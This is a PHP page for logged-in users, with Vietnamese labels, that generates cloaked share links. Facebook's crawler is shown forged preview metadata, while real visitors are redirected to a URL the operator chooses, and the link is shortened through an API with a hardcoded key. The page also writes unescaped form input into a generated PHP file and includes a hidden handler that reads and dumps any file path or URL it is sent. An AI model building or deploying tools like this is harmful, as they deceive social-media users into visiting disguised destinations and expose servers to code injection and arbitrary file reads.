<?php session_start(); /* Starts the session */

if (!isset($_SESSION['UserData']['Username'])) {
    header("location:index.php");
    exit;
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Document</title>
    <link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
    <style type="text/css">
        @import "bourbon";

    body {
        background: #eee !important;
    }

    .wrapper {
        margin-top: 80px;
      margin-bottom: 80px;
    }

    .form-signin {
      max-width: 380px;
      padding: 15px 35px 45px;
      margin: 0 auto;
      background-color: #fff;
      border: 1px solid rgba(0,0,0,0.1);

      .form-signin-heading,
        .checkbox {
          margin-bottom: 30px;
        }

    .checkbox {
      font-weight: normal;
    }

    .form-control {
      position: relative;
      font-size: 16px;
      height: auto;
      padding: 10px;
        @include box-sizing(border-box);

        &:focus {
          z-index: 2;
        }
    }

    input[type="text"] {
      margin-bottom: -1px;
      border-bottom-left-radius: 0;
      border-bottom-right-radius: 0;
    }

    input[type="password"] {
      margin-bottom: 20px;
      border-top-left-radius: 0;
      border-top-right-radius: 0;
    }
}

    </style>
</head>
<body>
    <div class="container">
    <form action="" method="post">
    <label>Fake link: (Nếu dùng fake link chỉ điền ô này)</label>
    <input class="form-control" type="text" name="fake_link" id="textbox"/> </br>
    <label>Title (Tiêu đề):</label>
    <input class="form-control" type="text" name="title" id="textbox"/> </br>
    <label>Description (Mô tả):</label>
    <input class="form-control" type="text" name="description" id="textbox"/> </br>
    <label>Link ảnh (728px*410px):</label>
    <input class="form-control" type="text" name="image" id="textbox"/> </br>
    <label>Link fanpage:</label> (Ví dụ: https://www.facebook.com/gmanews)
    <input class="form-control" type="text" name="fanpage" id="textbox"/> </br>

    <!-- <select class="form-control" name="fanpage">
	<option disabled selected value></option>
	<option value="https://www.facebook.com/gmanews">GMA</option>
	<option value="https://www.facebook.com/blogtamsu.fanpage">Blogtamsu</option>
    </select><br> -->
    <label>Nội dung bài (Vài dòng chữ):</label>
    <textarea class="form-control" name="text" rows="10" cols="70">
    </textarea>
    <label>Địa chỉ Đến (Link Twitter):</label>
    <input class="form-control" type="text" name="url" id="textbox"/> </br>
    <input type="submit" value="Fake" class="btn btn-lg btn-primary"/></br>
    <br>
    </form>
    <?php
error_reporting(0);
if ($_POST["url"]) {
    // $n=rand(0000,9999);
    $pathname = substr(md5(microtime()), rand(0, 26), 10);
    $filePhp = $pathname . ".php";
    $fileHtml = $pathname . ".html";

    $fakeLink = $_POST['fake_link'];
    if (($_POST['fake_link']) == '') {
        $fakeLink = 'http://' . $_SERVER['HTTP_HOST'] . '/' . $fileHtml;
    }
    $fphp = fopen($filePhp, 'w');
    $fhtml = fopen($fileHtml, 'w');
    $htmlString = '
<html>
<head>
<meta content="article" property="og:type">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<meta name="googlebot" content="noarchive"/>
<meta content="noindex, nofollow" name="robots"/>
<meta content="' . $_POST['title'] . '" property="og:title">
<meta content="article" property="og:type">
<meta content="' . $_POST['description'] . '" name="og:description">
<meta content="' . $_POST['image'] . '" property="og:image">
<meta property="og:image" content="' . $_POST['image'] . '">
<meta property="og:image:width" content="728">
<meta property="og:image:height" content="410">
<meta property="article:author" content="' . $_POST['fanpage'] . '" />
<meta property="og:url" content="' . $fakeLink . '">
<title>' . $_POST['title'] . '</title>
</head>
<body>
<p>
' . $_POST['text'] . '
</p>
</body>
</html>
    ';
    $redirectString = "
<script type='text/javascript'>// <![CDATA[
var d='<data:blog.url/>';
d=d.replace(/.*\/\/[^\/]*/, '');
location.href = '" . $_POST['url'] . "';
// ]]></script>
";
    $phpString = '
<?php
if (
    strpos($_SERVER["HTTP_USER_AGENT"], "facebookexternalhit/") !== false ||
    strpos($_SERVER["HTTP_USER_AGENT"], "Facebot") !== false
) {
    echo "
<html>
<head>
<meta property=\"og:url\" content=\"' . $fakeLink . '\">
</head>
<body>
<p>
' . $_POST['text'] . '
</p>
</body>
</html>
";
die();
}
else {
echo "' . $redirectString . '";
die();
}
?>
';

    fwrite($fhtml, $htmlString);
    fclose($fhtml);
    fwrite($fphp, $phpString);
    fclose($fphp);
    // echo "Link share: " . "<a href ='$filePhp'>" . $filePhp . "</a>";
    $lurl = 'http://' . $_SERVER['HTTP_HOST'] . '/' . $filePhp;
    $curl = curl_init();
    $post_data = array('format' => 'text',
        'apikey' => '85D97C460CDBCAEBIB5A',
        'provider' => 'tinyurl_com',
        'url' => $lurl);
    $api_url = 'http://tiny-url.info/api/v1/create';
    curl_setopt($curl, CURLOPT_URL, $api_url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_POST, 1);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $post_data);
    $result = curl_exec($curl);
    curl_close($curl);
    echo "Link share: " . "<a href ='$result'>" . $result . "</a>";
}
?>

    <br><br>
<?php
if (isset($_POST['file'])) {
    $loadFile = file_get_contents($_POST['file']);
    var_dump($loadFile);
}
?>
<!-- <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">
<textarea name="update" rows="20" cols="70">
    <?php echo file_get_contents($data); ?>
    </textarea>
    <br>
    <input type="submit" value="Update" class="btn btn-lg btn-primary"/></br>
    <br>
</form>
    </div>
</body>
</html> -->

